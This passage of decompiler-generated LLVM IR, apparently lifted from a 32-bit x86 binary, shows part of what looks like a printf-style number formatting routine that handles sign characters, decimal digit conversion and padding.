  %v1_8054cd3 = phi i32 [ %v0_8054c39, %dec_label_pc_8054c39 ], [ %v0_8054c78.pre, %dec_label_pc_8054c3f ], [ 0, %dec_label_pc_8054c35 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_8054c39 ], [ 102, %dec_label_pc_8054c3f ], [ %stack_var_-197.0, %dec_label_pc_8054c35 ]
  %v2_8054c43 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8054c43, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_8054c5e = load i32, i32* %edx.global-to-local, align 4
  %v1_8054c5e = inttoptr i32 %v0_8054c5e to i8*
  %v2_8054c5e = load i8, i8* %v1_8054c5e, align 1
  %v3_8054c5e = zext i8 %v2_8054c5e to i32
  %v5_8054c5e = and i32 %v2_8054c43, -256
  %v6_8054c5e = or i32 %v3_8054c5e, %v5_8054c5e
  store i32 %v6_8054c5e, i32* %eax.global-to-local, align 4
  %v1_8054c60 = add i32 %v0_8054c5e, 1
  store i32 %v1_8054c60, i32* %edi.global-to-local, align 4
  store i32 %v6_8054c5e, i32* %stack_var_-22, align 4
  %v2_8054c6e = sub i32 %v1_8054bfb, %v1_8054c60
  store i32 %v2_8054c6e, i32* %edx.global-to-local, align 4
  %v1_8054c78 = icmp eq i32 %v1_8054cd3, 0
  %v2_8054c78 = icmp slt i32 %v1_8054cd3, 0
  br i1 %v2_8054c78, label %dec_label_pc_8054cc7, label %dec_label_pc_8054c7c

dec_label_pc_8054c7c:                             ; preds = %dec_label_pc_8054c43
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8054c88 = sub i32 %v1_8054cd3, %v2_8054c6e
  %v8_8054c88 = xor i32 %v2_8054c6e, %v1_8054cd3
  %v9_8054c88 = xor i32 %v2_8054c88, %v1_8054cd3
  %v10_8054c88 = and i32 %v9_8054c88, %v8_8054c88
  %v11_8054c88 = icmp slt i32 %v10_8054c88, 0
  %v13_8054c88 = icmp slt i32 %v2_8054c88, 0
  %v2_8054c8a = icmp eq i1 %v13_8054c88, %v11_8054c88
  br i1 %v2_8054c8a, label %dec_label_pc_8054c8c, label %dec_label_pc_8054cc0

dec_label_pc_8054c8c:                             ; preds = %dec_label_pc_8054c7c
  store i32 %v2_8054c88, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_8054c88, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_8054ca1, label %dec_label_pc_8054cbc

dec_label_pc_8054ca1:                             ; preds = %dec_label_pc_8054c8c
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8054cbc

dec_label_pc_8054cbc:                             ; preds = %dec_label_pc_8054c8c, %dec_label_pc_8054ca1
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_8054ca1 ], [ %stack_var_-132, %dec_label_pc_8054c8c ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054cdc

dec_label_pc_8054cc0:                             ; preds = %dec_label_pc_8054c7c
  %v4_8054cc2 = icmp eq i1 %v1_8054c78, false
  br i1 %v4_8054cc2, label %dec_label_pc_8054ccd, label %dec_label_pc_8054cc4

dec_label_pc_8054cc4:                             ; preds = %dec_label_pc_8054cc0
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054cc7

dec_label_pc_8054cc7:                             ; preds = %dec_label_pc_8054c43, %dec_label_pc_8054cc4
  %v0_8054d0f73 = phi i32 [ %v1_8054cd3, %dec_label_pc_8054c43 ], [ -1, %dec_label_pc_8054cc4 ]
  %v2_8054cc7 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8054cc7, i32* @ecx, align 4
  br label %dec_label_pc_8054cdc

dec_label_pc_8054ccd:                             ; preds = %dec_label_pc_8054cc0
  %v2_8054cd1 = add i32 %v1_8054c60, %v1_8054cd3
  store i32 %v2_8054cd1, i32* %edi.global-to-local, align 4
  %v2_8054cd3 = sub i32 %v2_8054c6e, %v1_8054cd3
  store i32 %v2_8054cd3, i32* %edx.global-to-local, align 4
  %v2_8054cd5 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8054cd5, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054cdc

dec_label_pc_8054cdc:                             ; preds = %dec_label_pc_8054cc7, %dec_label_pc_8054cbc, %dec_label_pc_8054ccd
  %v0_8054d0f72 = phi i32 [ %v0_8054d0f73, %dec_label_pc_8054cc7 ], [ -1, %dec_label_pc_8054cbc ], [ -1, %dec_label_pc_8054ccd ]
  %v0_8054cf8 = phi i32 [ %v2_8054cc7, %dec_label_pc_8054cc7 ], [ %storemerge10, %dec_label_pc_8054cbc ], [ %v2_8054cd5, %dec_label_pc_8054ccd ]
  %v0_8054ce9 = phi i32 [ %v2_8054c6e, %dec_label_pc_8054cc7 ], [ 0, %dec_label_pc_8054cbc ], [ %v2_8054cd3, %dec_label_pc_8054ccd ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_8054ce3 = inttoptr i32 %v1_805493b to i8*
  %v3_8054ce3 = load i8, i8* %v2_8054ce3, align 1
  %v4_8054ce3 = and i8 %v3_8054ce3, 16
  %v5_8054ce3 = icmp eq i8 %v4_8054ce3, 0
  %v1_8054ce7 = icmp eq i1 %v5_8054ce3, false
  br i1 %v1_8054ce7, label %dec_label_pc_8054cf8, label %dec_label_pc_8054ce9

dec_label_pc_8054ce9:                             ; preds = %dec_label_pc_8054cdc
  %v1_8054ce9 = icmp eq i32 %v0_8054ce9, 0
  %v1_8054ceb = icmp eq i1 %v1_8054ce9, false
  br i1 %v1_8054ceb, label %dec_label_pc_8054cf8, label %dec_label_pc_8054ced

dec_label_pc_8054ced:                             ; preds = %dec_label_pc_8054ce9
  br i1 %v12_8054b51, label %dec_label_pc_8054d0f, label %dec_label_pc_8054cf4

dec_label_pc_8054cf4:                             ; preds = %dec_label_pc_8054ced
  %v0_8054cf4 = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_8054cf4, 1
  br i1 %tmp140, label %dec_label_pc_8054d0f, label %dec_label_pc_8054cf8

dec_label_pc_8054cf8:                             ; preds = %dec_label_pc_8054cf4, %dec_label_pc_8054ce9, %dec_label_pc_8054cdc
  %v1_8054cf8 = inttoptr i32 %v0_8054cf8 to i32*
  store i32 112, i32* %v1_8054cf8, align 4
  %v0_8054cfe = load i32, i32* @ecx, align 4
  %v1_8054cfe = add i32 %v0_8054cfe, 4
  %v2_8054cfe = inttoptr i32 %v1_8054cfe to i32*
  store i32 1, i32* %v2_8054cfe, align 4
  %v0_8054d05 = load i32, i32* @ecx, align 4
  %v1_8054d05 = add i32 %v0_8054d05, 8
  %v2_8054d05 = inttoptr i32 %v1_8054d05 to i32*
  store i32 ptrtoint (i32* @global_var_805ca00.295 to i32), i32* %v2_8054d05, align 4
  %v0_8054d0c = load i32, i32* @ecx, align 4
  %v1_8054d0c = add i32 %v0_8054d0c, 12
  store i32 %v1_8054d0c, i32* @ecx, align 4
  %v0_8054d0f.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054d0f

dec_label_pc_8054d0f:                             ; preds = %dec_label_pc_8054cf4, %dec_label_pc_8054ced, %dec_label_pc_8054cf8
  %v0_8054d14 = phi i32 [ %v0_8054cf8, %dec_label_pc_8054cf4 ], [ %v0_8054cf8, %dec_label_pc_8054ced ], [ %v1_8054d0c, %dec_label_pc_8054cf8 ]
  %v0_8054d0f = phi i32 [ %v0_8054d0f72, %dec_label_pc_8054cf4 ], [ %v0_8054d0f72, %dec_label_pc_8054ced ], [ %v0_8054d0f.pre, %dec_label_pc_8054cf8 ]
  %v1_8054d0f = add i32 %v0_8054d0f, 1
  %v8_8054d0f = icmp eq i32 %v1_8054d0f, 0
  store i32 %v1_8054d0f, i32* %ebx.global-to-local, align 4
  br i1 %v8_8054d0f, label %dec_label_pc_8054d29, label %dec_label_pc_8054d12

dec_label_pc_8054d12:                             ; preds = %dec_label_pc_8054d0f
  store i32 %v1_8054d0f, i32* %eax.global-to-local, align 4
  %v1_8054d14 = inttoptr i32 %v0_8054d14 to i32*
  store i32 176, i32* %v1_8054d14, align 4
  %v0_8054d1a = load i32, i32* %eax.global-to-local, align 4
  %v1_8054d1a = sub i32 0, %v0_8054d1a
  store i32 %v1_8054d1a, i32* %eax.global-to-local, align 4
  %v1_8054d1c = load i32, i32* @ecx, align 4
  %v2_8054d1c = add i32 %v1_8054d1c, 4
  %v3_8054d1c = inttoptr i32 %v2_8054d1c to i32*
  store i32 %v1_8054d1a, i32* %v3_8054d1c, align 4
  %v0_8054d1f = load i32, i32* @ecx, align 4
  %v1_8054d1f = add i32 %v0_8054d1f, 8
  %v2_8054d1f = inttoptr i32 %v1_8054d1f to i32*
  store i32 ptrtoint (i32* @global_var_805c9f3.294 to i32), i32* %v2_8054d1f, align 4
  %v0_8054d26 = load i32, i32* @ecx, align 4
  %v1_8054d26 = add i32 %v0_8054d26, 12
  store i32 %v1_8054d26, i32* @ecx, align 4
  br label %dec_label_pc_8054d29

dec_label_pc_8054d29:                             ; preds = %dec_label_pc_8054d0f, %dec_label_pc_8054d12
  %v0_8054d2d = phi i32 [ %v0_8054d14, %dec_label_pc_8054d0f ], [ %v1_8054d26, %dec_label_pc_8054d12 ]
  %v0_8054d29 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054d29 = icmp eq i32 %v0_8054d29, 0
  br i1 %v1_8054d29, label %dec_label_pc_8054d3c, label %dec_label_pc_8054d2d

dec_label_pc_8054d2d:                             ; preds = %dec_label_pc_8054d29
  %v1_8054d2d = inttoptr i32 %v0_8054d2d to i32*
  store i32 112, i32* %v1_8054d2d, align 4
  %v0_8054d33 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054d33 = load i32, i32* @ecx, align 4
  %v2_8054d33 = add i32 %v1_8054d33, 4
  %v3_8054d33 = inttoptr i32 %v2_8054d33 to i32*
  store i32 %v0_8054d33, i32* %v3_8054d33, align 4
  %v0_8054d36 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054d36 = load i32, i32* @ecx, align 4
  %v2_8054d36 = add i32 %v1_8054d36, 8
  %v3_8054d36 = inttoptr i32 %v2_8054d36 to i32*
  store i32 %v0_8054d36, i32* %v3_8054d36, align 4
  %v0_8054d39 = load i32, i32* @ecx, align 4
  %v1_8054d39 = add i32 %v0_8054d39, 12
  store i32 %v1_8054d39, i32* @ecx, align 4
  br label %dec_label_pc_8054d3c

dec_label_pc_8054d3c:                             ; preds = %dec_label_pc_8054d29, %dec_label_pc_8054d2d
  %v0_8054d5a = phi i32 [ %v0_8054d2d, %dec_label_pc_8054d29 ], [ %v1_8054d39, %dec_label_pc_8054d2d ]
  br i1 %v1_8054b56, label %dec_label_pc_8054d50, label %dec_label_pc_8054d43

dec_label_pc_8054d43:                             ; preds = %dec_label_pc_8054d3c
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_8054d4a = load i8, i8* %v2_8054ce3, align 1
  %v4_8054d4a = and i8 %v3_8054d4a, 16
  %v5_8054d4a = icmp eq i8 %v4_8054d4a, 0
  br i1 %v5_8054d4a, label %dec_label_pc_8054d6d, label %dec_label_pc_8054d50

dec_label_pc_8054d50:                             ; preds = %dec_label_pc_8054d43, %dec_label_pc_8054d3c
  %v0_8054d50 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054d52 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054d52 = sub i32 %v0_8054d50, %v1_8054d52
  store i32 %v2_8054d52, i32* %eax.global-to-local, align 4
  %v1_8054d54 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054d54 = sub i32 %v2_8054d52, %v1_8054d54
  %v8_8054d54 = xor i32 %v1_8054d54, %v2_8054d52
  %v9_8054d54 = xor i32 %v2_8054d54, %v2_8054d52
  %v10_8054d54 = and i32 %v9_8054d54, %v8_8054d54
  %v11_8054d54 = icmp slt i32 %v10_8054d54, 0
  %v13_8054d54 = icmp slt i32 %v2_8054d54, 0
  %v2_8054d56 = icmp eq i1 %v13_8054d54, %v11_8054d54
  br i1 %v2_8054d56, label %dec_label_pc_8054d6d, label %dec_label_pc_8054d58

dec_label_pc_8054d58:                             ; preds = %dec_label_pc_8054d50
  %v2_8054d58 = sub i32 %v1_8054d54, %v2_8054d52
  store i32 %v2_8054d58, i32* %ebp.global-to-local, align 4
  %v1_8054d5a = inttoptr i32 %v0_8054d5a to i32*
  store i32 176, i32* %v1_8054d5a, align 4
  %v0_8054d60 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054d60 = load i32, i32* @ecx, align 4
  %v2_8054d60 = add i32 %v1_8054d60, 4
  %v3_8054d60 = inttoptr i32 %v2_8054d60 to i32*
  store i32 %v0_8054d60, i32* %v3_8054d60, align 4
  %v0_8054d63 = load i32, i32* @ecx, align 4
  %v1_8054d63 = add i32 %v0_8054d63, 8
  %v2_8054d63 = inttoptr i32 %v1_8054d63 to i32*
  store i32 ptrtoint (i32* @global_var_805c9f3.294 to i32), i32* %v2_8054d63, align 4
  %v0_8054d6a = load i32, i32* @ecx, align 4
  %v1_8054d6a = add i32 %v0_8054d6a, 12
  store i32 %v1_8054d6a, i32* @ecx, align 4
  br label %dec_label_pc_8054d6d

dec_label_pc_8054d6d:                             ; preds = %dec_label_pc_8054d50, %dec_label_pc_8054d43, %dec_label_pc_8054d58
  %v1_8054df084 = phi i32 [ %v0_8054d5a, %dec_label_pc_8054d50 ], [ %v0_8054d5a, %dec_label_pc_8054d43 ], [ %v1_8054d6a, %dec_label_pc_8054d58 ]
  %v12_8054d6d = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8054d6d, label %dec_label_pc_8054de3, label %dec_label_pc_8054d74

dec_label_pc_8054d74:                             ; preds = %dec_label_pc_8054d6d
  %v0_8054d7b = load i32, i32* %esi.global-to-local, align 4
  %v2_8054d7b = icmp slt i32 %v0_8054d7b, 0
  %v1_8054d7d = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_8054d7b, i32* %edx.global-to-local, align 4
  br i1 %v2_8054d7b, label %dec_label_pc_8054d8c, label %dec_label_pc_8054d83

dec_label_pc_8054d83:                             ; preds = %dec_label_pc_8054d74
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054d95

dec_label_pc_8054d8c:                             ; preds = %dec_label_pc_8054d74
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_8054d93 = sub i32 0, %v0_8054d7b
  store i32 %v1_8054d93, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054d95

dec_label_pc_8054d95:                             ; preds = %dec_label_pc_8054d83, %dec_label_pc_8054d8c
  %v0_8054da977 = phi i32 [ %v0_8054d7b, %dec_label_pc_8054d83 ], [ %v1_8054d93, %dec_label_pc_8054d8c ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8054d9d = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8054d9d, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054da9

dec_label_pc_8054da9:                             ; preds = %dec_label_pc_8054da9.backedge, %dec_label_pc_8054d95
  %v0_8054db7 = phi i32 [ %v0_8054dba, %dec_label_pc_8054da9.backedge ], [ 2, %dec_label_pc_8054d95 ]
  %v0_8054db3 = phi i32 [ %v0_8054db3.pre, %dec_label_pc_8054da9.backedge ], [ %v2_8054d9d, %dec_label_pc_8054d95 ]
  %v0_8054da9 = phi i32 [ %v9_8054db1, %dec_label_pc_8054da9.backedge ], [ %v0_8054da977, %dec_label_pc_8054d95 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_8054db0 = ashr i32 %v0_8054da9, 31
  %v2_8054db1 = zext i32 %v0_8054da9 to i64
  %v4_8054db1 = zext i32 %v1_8054db0 to i64
  %v5_8054db1 = mul nuw i64 %v4_8054db1, 4294967296
  %v6_8054db1 = or i64 %v5_8054db1, %v2_8054db1
  %v8_8054db1 = sdiv i64 %v6_8054db1, 10
  %v9_8054db1 = trunc i64 %v8_8054db1 to i32
  store i32 %v9_8054db1, i32* %eax.global-to-local, align 4
  %v11_8054db1 = srem i64 %v6_8054db1, 10
  %v12_8054db1 = trunc i64 %v11_8054db1 to i8
  %v1_8054db3 = add i32 %v0_8054db3, -1
  store i32 %v1_8054db3, i32* %ebx.global-to-local, align 4
  %v1_8054db4 = add i8 %v12_8054db1, 48
  %v1_8054db7 = add i32 %v0_8054db7, 1
  store i32 %v1_8054db7, i32* %esi.global-to-local, align 4
  %v3_8054db8 = inttoptr i32 %v1_8054db3 to i8*
  store i8 %v1_8054db4, i8* %v3_8054db8, align 1
  %v0_8054dba = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_8054db1, i32* %edx.global-to-local, align 4
  %v7_8054dbf = icmp sgt i32 %v0_8054dba, 3
  br i1 %v7_8054dbf, label %dec_label_pc_8054dc1, label %dec_label_pc_8054da9.backedge

dec_label_pc_8054dc1:                             ; preds = %dec_label_pc_8054da9
  %v2_8054dc1 = icmp eq i32 %v9_8054db1, 0
  %v1_8054dc3 = icmp eq i1 %v2_8054dc1, false
  br i1 %v1_8054dc3, label %dec_label_pc_8054da9.backedge, label %dec_label_pc_8054dc5

dec_label_pc_8054da9.backedge:                    ; preds = %dec_label_pc_8054dc1, %dec_label_pc_8054da9
  %v0_8054db3.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054da9

dec_label_pc_8054dc5:                             ; preds = %dec_label_pc_8054dc1
  %v0_8054dc5 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8054dc5, i32* %edx.global-to-local, align 4
  %v0_8054dc7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054dc7 = add i32 %v0_8054dc7, -2
  store i32 %v1_8054dc7, i32* %eax.global-to-local, align 4
  %v1_8054dca = trunc i32 %v0_8054dc5 to i8
  %v3_8054dca = add i32 %v0_8054dc7, -1
  %v4_8054dca = inttoptr i32 %v3_8054dca to i8*
  store i8 %v1_8054dca, i8* %v4_8054dca, align 1
  %v5_8054dcd = load i32, i32* %edx.global-to-local, align 4
  %v6_8054dcd = and i32 %v5_8054dcd, -256
  %v7_8054dcd = or i32 %v6_8054dcd, %stack_var_-42.0
  store i32 %v7_8054dcd, i32* %edx.global-to-local, align 4
  %v2_8054dd1 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8054dd1 = add i32 %v2_8054dd1, -2
  %v4_8054dd1 = inttoptr i32 %v3_8054dd1 to i8*
  store i8 %v1_8054d7d, i8* %v4_8054dd1, align 1
  %v0_8054dd4 = load i32, i32* @ecx, align 4
  %v1_8054dd4 = inttoptr i32 %v0_8054dd4 to i32*
  store i32 112, i32* %v1_8054dd4, align 4
  %v0_8054dda = load i32, i32* %esi.global-to-local, align 4
  %v1_8054dda = load i32, i32* @ecx, align 4
  %v2_8054dda = add i32 %v1_8054dda, 4
  %v3_8054dda = inttoptr i32 %v2_8054dda to i32*
  store i32 %v0_8054dda, i32* %v3_8054dda, align 4
  %v0_8054ddd = load i32, i32* %eax.global-to-local, align 4
  %v1_8054ddd = load i32, i32* @ecx, align 4
  %v2_8054ddd = add i32 %v1_8054ddd, 8
  %v3_8054ddd = inttoptr i32 %v2_8054ddd to i32*
  store i32 %v0_8054ddd, i32* %v3_8054ddd, align 4
  %v0_8054de0 = load i32, i32* @ecx, align 4
  %v1_8054de0 = add i32 %v0_8054de0, 12
  store i32 %v1_8054de0, i32* @ecx, align 4
  br label %dec_label_pc_8054de3

dec_label_pc_8054de3:                             ; preds = %dec_label_pc_8054d6d, %dec_label_pc_8054a08, %dec_label_pc_8054dc5
  %v0_8054e64 = phi i32 [ %v1_8054df084, %dec_label_pc_8054d6d ], [ %v2_8054a10, %dec_label_pc_8054a08 ], [ %v1_8054de0, %dec_label_pc_8054dc5 ]
  %v2_8054de3 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8054de3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054de7

dec_label_pc_8054de7:                             ; preds = %dec_label_pc_8054de7, %dec_label_pc_8054de3
  %v0_8054de7 = phi i32 [ %v2_8054de3, %dec_label_pc_8054de3 ], [ %v1_8054de9, %dec_label_pc_8054de7 ]
  %stack_var_-216.0 = phi i32 [ %v3_80548fb, %dec_label_pc_8054de3 ], [ %v5_8054dec, %dec_label_pc_8054de7 ]
  %v1_8054de7 = inttoptr i32 %v0_8054de7 to i32*
  %v2_8054de7 = load i32, i32* %v1_8054de7, align 4
  store i32 %v2_8054de7, i32* %edx.global-to-local, align 4
  %v1_8054de9 = add i32 %v0_8054de7, 12
  store i32 %v1_8054de9, i32* %eax.global-to-local, align 4
  %v5_8054dec = sub i32 %stack_var_-216.0, %v2_8054de7
  %v7_8054df0 = icmp ult i32 %v1_8054de9, %v0_8054e64
  br i1 %v7_8054df0, label %dec_label_pc_8054de7, label %dec_label_pc_8054df4

dec_label_pc_8054df4:                             ; preds = %dec_label_pc_8054de7
  %v5_8054dfd = icmp eq i8 %stack_var_-26.0, 0
  %v1_8054e0d = icmp eq i1 %v5_8054dfd, false
  %v2_8054e0d = zext i1 %v1_8054e0d to i32
  %v2_8054e10 = sub i32 %v5_8054dec, %v2_8054e0d
  store i32 %v2_8054e10, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_8054e10, i32* %eax.global-to-local, align 4
  store i32 %v0_8054e64, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_8054e10, 1
  br i1 %tmp141, label %dec_label_pc_8054e66, label %dec_label_pc_8054e26

dec_label_pc_8054e26:                             ; preds = %dec_label_pc_8054df4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_8054e2d = inttoptr i32 %v1_805493b to i8*
  %v3_8054e2d = load i8, i8* %v2_8054e2d, align 1
  %v4_8054e2d = and i8 %v3_8054e2d, 8
  %v5_8054e2d = icmp eq i8 %v4_8054e2d, 0
  br i1 %v5_8054e2d, label %dec_label_pc_8054e48, label %dec_label_pc_8054e33

dec_label_pc_8054e33:                             ; preds = %dec_label_pc_8054e26
  %v1_8054e33 = add i32 %v0_8054e64, 12
  store i32 %v1_8054e33, i32* %esi.global-to-local, align 4
  %v1_8054e36 = inttoptr i32 %v0_8054e64 to i32*
  store i32 160, i32* %v1_8054e36, align 4
  %v0_8054e3c = load i32, i32* %eax.global-to-local, align 4
  %v1_8054e3c = load i32, i32* @ecx, align 4
  %v2_8054e3c = add i32 %v1_8054e3c, 4
  %v3_8054e3c = inttoptr i32 %v2_8054e3c to i32*
  store i32 %v0_8054e3c, i32* %v3_8054e3c, align 4
  %v0_8054e3f = load i32, i32* @ecx, align 4
  %v1_8054e3f = add i32 %v0_8054e3f, 8
  %v2_8054e3f = inttoptr i32 %v1_8054e3f to i32*
  store i32 ptrtoint (i32* @global_var_805c9f3.294 to i32), i32* %v2_8054e3f, align 4
  br label %dec_label_pc_8054e66

dec_label_pc_8054e48:                             ; preds = %dec_label_pc_8054e26
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8054e4f = add i32 %tmp112, 16
  %v2_8054e4f = inttoptr i32 %v1_8054e4f to i32*
  %v3_8054e4f = load i32, i32* %v2_8054e4f, align 4
  %v9_8054e4f = icmp eq i32 %v3_8054e4f, 48
  %v1_8054e53 = icmp eq i1 %v9_8054e4f, false
  br i1 %v1_8054e53, label %dec_label_pc_8054e60, label %dec_label_pc_8054e55

dec_label_pc_8054e55:                             ; preds = %dec_label_pc_8054e48
  %v3_8054e55 = load i32, i32* %stack_var_-152, align 4
  %v5_8054e55 = add i32 %v3_8054e55, %v2_8054e10
  store i32 %v5_8054e55, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8054e64

dec_label_pc_8054e5b:                             ; preds = %dec_label_pc_8054e6c
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054e93

dec_label_pc_8054e60:                             ; preds = %dec_label_pc_8054e48
  br label %dec_label_pc_8054e64

dec_label_pc_8054e64:                             ; preds = %dec_label_pc_8054e55, %dec_label_pc_8054e60
  store i32 %v0_8054e64, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054e66

dec_label_pc_8054e66:                             ; preds = %dec_label_pc_8054df4, %dec_label_pc_8054e33, %dec_label_pc_8054e64
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8054e68 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8054e68, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054e6c

dec_label_pc_8054e6c:                             ; preds = %dec_label_pc_8054e8a, %dec_label_pc_8054e66
  call void @__pseudo_call(i32 %tmp112)
  %v0_8054e85 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054e85 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054e85 = add i32 %v1_8054e85, 4
  %v3_8054e85 = inttoptr i32 %v2_8054e85 to i32*
  %v4_8054e85 = load i32, i32* %v3_8054e85, align 4
  %v15_8054e85 = icmp eq i32 %v0_8054e85, %v4_8054e85
  %v1_8054e88 = icmp eq i1 %v15_8054e85, false
  br i1 %v1_8054e88, label %dec_label_pc_8054e5b, label %dec_label_pc_8054e8a

dec_label_pc_8054e8a:                             ; preds = %dec_label_pc_8054e6c
  %v1_8054e8a = add i32 %v1_8054e85, 12
  store i32 %v1_8054e8a, i32* %ebx.global-to-local, align 4
  %v0_8054e8d = load i32, i32* %edi.global-to-local, align 4
  %v2_8054e8d = add i32 %v0_8054e8d, %v0_8054e85
  store i32 %v2_8054e8d, i32* %edi.global-to-local, align 4
  %v1_8054e8f = load i32, i32* %esi.global-to-local, align 4
  %v7_8054e8f = icmp ult i32 %v1_8054e8a, %v1_8054e8f
  br i1 %v7_8054e8f, label %dec_label_pc_8054e6c, label %dec_label_pc_8054e93

dec_label_pc_8054e93:                             ; preds = %dec_label_pc_8054e8a, %dec_label_pc_8054e5b
  %v0_8054e99 = phi i32 [ -1, %dec_label_pc_8054e5b ], [ %v2_8054e8d, %dec_label_pc_8054e8a ]
  store i32 %v0_8054e99, i32* %eax.global-to-local, align 4
  %v2_8054e9c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054e9c, i32* @esi, align 4
  store i32 %v0_80548de, i32* @edi, align 4
  store i32 %v0_80548dd, i32* @ebp, align 4
  ret i32 %v0_8054e99

; uselistorder directives
  uselistorder i32 %v0_8054e99, { 1, 0 }
  uselistorder i32 %v0_8054e85, { 1, 0 }
  uselistorder i32 %v1_8054de9, { 1, 2, 0 }
  uselistorder i32 %v0_8054de7, { 1, 0 }
  uselistorder i32 %v0_8054e64, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_8054dba, { 1, 0 }
  uselistorder i32 %v9_8054db1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8054da9, { 1, 0 }
  uselistorder i32 %v0_8054d7b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8054d54, { 1, 0 }
  uselistorder i32 %v1_8054d54, { 1, 0, 2 }
  uselistorder i32 %v2_8054d52, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8054c88, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8054c6e, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8054cd3, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_8054c39, { 0, 2, 1 }
  uselistorder i32 %v1_8054c12, { 1, 0 }
  uselistorder i32 %v0_8054c0d, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8054bda, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8054bd5, { 1, 0 }
  uselistorder i8 %v2_8054bce, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8054bce, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8054b58, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_8054b3d, { 1, 0 }
  uselistorder i32 %v1_8054b29, { 1, 0 }
  uselistorder i32 %v0_8054b1d, { 1, 0 }
  uselistorder i32 %v4_8054b04, { 1, 0 }
  uselistorder i32 %tmp148, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8054b09, { 1, 0 }
  uselistorder i32 %v2_8054ac7, { 1, 0, 2 }
  uselistorder i3 %v1_805497d, { 1, 0 }
  uselistorder i8 %v4_80549fc, { 1, 0 }
  uselistorder i32 %v3_805493b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_805493b, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_805490d, { 1, 0 }
  uselistorder i32 %v3_80548fb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st1.global-to-local, { 1, 0, 2 }
  uselistorder x86_fp80* %st0.global-to-local, { 1, 2, 3, 0 }
